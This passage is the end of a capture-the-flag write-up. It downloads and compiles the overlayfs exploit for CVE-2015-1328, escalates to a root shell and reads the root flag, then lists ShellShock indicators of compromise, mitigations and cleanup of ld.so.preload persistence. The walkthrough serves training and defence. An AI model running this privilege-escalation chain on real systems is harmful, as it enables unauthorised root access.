HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/plain]
Saving to: 'ofs.c'

100%[===============================================================>] 4,968       --.-K/s   in 0s

2025-09-19 17:36:39 (18.3 MB/s) - 'ofs.c' saved [4968/4968]
```

Trying to compile the exploit fails:

```
www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

Since `gcc` is installed, this might be a `PATH` issue:

```
www-data@ubuntu:/tmp$ echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
```

The default `PATH` value is different in [Ubuntu](https://askubuntu.com/questions/386629/what-are-the-default-path-values?ref=benheater.com); change it:


```
www-data@ubuntu:/tmp$ export PATH='/usr/lib/lightdm/lightdm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games'
```

This time the compilation succeeds:

```
www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
```

Run the exploit to get a root shell:

```
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

Finally, locate and get the root flag:

```
# ls -lah /root
total 20K
drwx------  2 root root 4.0K Sep  2  2020 .
drwxr-xr-x 22 root root 4.0K Sep  2  2020 ..
lrwxrwxrwx  1 root root    9 Sep  2  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3.1K Feb 19  2014 .bashrc
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-r--r--  1 root root   30 Sep  2  2020 root.txt
# cat /root/root.txt
<REDACTED-ROOT-FLAG>
```

# Summary

ShellShock is a high severity vulnerability (CVSSv3 score of 9.8) that provides attackers with remote code execution (RCE) on the system.

According to a [Huntress](https://www.huntress.com/threat-library/vulnerabilities/cve-2014-6271) blog post, the following indicators of compromise (IoCs) can reveal that ShellShock has been or is currently being exploited:

- Unusual strings, like `() { :; };`, in HTTP headers in web server logs (e.g. `access.log`).
- Egress connections to suspicious servers or unknown IP addresses.
- Unusual processes running under the web server user's account (e.g. `www-data` or `apache` running a reverse shell payload).
- The modification of existing files or the addition of new executable ones in web-accessible directories.

The same post makes the following mitigation recommendations:

- Update the bash package because patches were released back in September 2014.
- Utilize a Web Application Firewall (WAF) to inspect http requests and block patterns associated with ShellShock attacks.
- Audit your systems for legacy systems and patch them.

As for CVE-2015-1328, the best mitigation is updating the kernel to a patched version.

Finally, `/etc/ld.so.preload` is usually missing in Linux distributions.
When present, it might be a sign of a persistence mechanism employed by an attacker.
This particular persistence mechanism can be [removed](https://github.com/AmirHoseinTangsiriNET/LDSoPreload-LibraryInjection/) by removing the relevant entry from `/etc/ld.so.preload`:

```
sed -i '/reverse_shell.so/d' /etc/ld.so.preload
```

Also remove the malicious library:

```
rm /path/to/reverse_shell.so
```

If there is no legitimate reason for `/etc/ld.so.preload` to exist, remove it, too.
If this file is necessary, you can use mandatory access control policies via AppArmor or SELinux to limit which processes can write to it.
